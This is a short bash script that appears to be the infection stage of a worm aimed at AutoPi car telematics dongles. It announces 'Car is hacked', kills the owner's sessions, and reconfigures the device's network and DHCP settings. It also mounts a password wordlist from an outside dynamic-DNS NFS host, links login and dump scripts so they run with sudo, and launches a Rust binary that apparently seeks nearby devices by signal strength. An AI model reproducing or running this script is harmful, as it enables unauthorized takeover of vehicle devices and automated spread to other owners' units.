#!/bin/bash

echo "Car is hacked"
date >> log.start 2>&1
#Exit connection for infecting AutoPi
skill -KILL -u pi

if [[ $(ip address show dev uap0) != *"192.168.4.100"*  ]]
then

    setsid autopi audio.speak "Car is hacked" &> /dev/null &

    #Manual install of sshpass
    mkdir sshpass-pkg
    wget http://raspbian.raspberrypi.org/raspbian/pool/main/s/sshpass/sshpass_1.06-1_armhf.deb
    dpkg -x *.deb sshpass-pkg
    cp sshpass-pkg/usr/bin/sshpass /usr/bin/

    #Set own IP to 192.168.4.100 on own subnet (interface uap0)
    echo "192.168.4.100 local.autopi.io" > /etc/dnsmasq.hosts
    systemctl restart dnsmasq

    echo -e "hostname\nclientid\npersistent\noption rapid_commit\noption domain_name_servers, domain_name, domain_search, host_name\noption classless_static_routes\noption ntp_servers\noption interface_mtu\nrequire dhcp_server_identifier\nslaac-private\n\ninterface wlan0\nmetric 200\nnohook wpa_supplicant\nnoarp\nnoipv4ll\n\ninterface uap0\nstatic ip_address=192.168.4.100/24\nmetric 100\nnohook wpa_supplicant\n" > /etc/dhcpcd.conf
    systemctl restart dhcpcd

    #Delete old address
    ip addr del 192.168.4.1/24 dev uap0 >> log.start 2>&1

    #Make directory for wordlist
    mkdir /home/pi/list/

    #Mount wordlist in /home/pi/list
    mount.nfs4 -s -o rsize=1024 pojksaker.ddns.net:/list/ list

    #Make links so that scripts may be run with sudo
    cd /usr/local/bin
    ln /home/pi/login.sh
    ln /home/pi/dumpexec.sh
    ln /home/pi/logoff.sh
    cd /home/pi/

    #Execute rust binary
    #-60 dbm is about 2.5 m
    if [[ $(ps -e | grep -i rostigare) != *"rostigare"* ]]
    then
	setsid nice --20 ./rostigare -50.0 $(hostname) &> log.rust&
    fi

    systemctl stop wpa-manager
    wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf
fi

exit
